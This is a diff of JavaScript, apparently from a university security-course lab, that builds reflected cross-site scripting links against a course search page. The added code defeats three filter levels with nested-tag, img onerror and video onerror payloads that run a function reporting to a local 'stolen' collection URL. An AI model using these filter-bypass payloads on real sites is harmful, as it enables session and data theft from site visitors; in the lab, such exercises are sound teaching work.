@@ -135,13 +135,28 @@ function payload(attacker) {
 }
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
-		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script " + " >");
 	} 
 	else {
 	// Implement code to defeat XSS defenses here.
+	switch(xssdefense)
+    {
+        case 1:
+            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<scrscriptipt"+">"+payload.toString()+";payload(\"" + attacker+"\");</scrscriptipt"+">");
+            break;
+        case 2:
+            return target+"./search?xssdefense="+xssdefense.toString()+"&q="+
+            encodeURIComponent("<img src=x onerror=alert(\"hi);\">");
+            break;
+        case 3:
+            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<video src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
+            break;
+	}
 	}
 }
-var xssdefense = 0;
+var xssdefense = 2;
 var target = "http://trurl.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
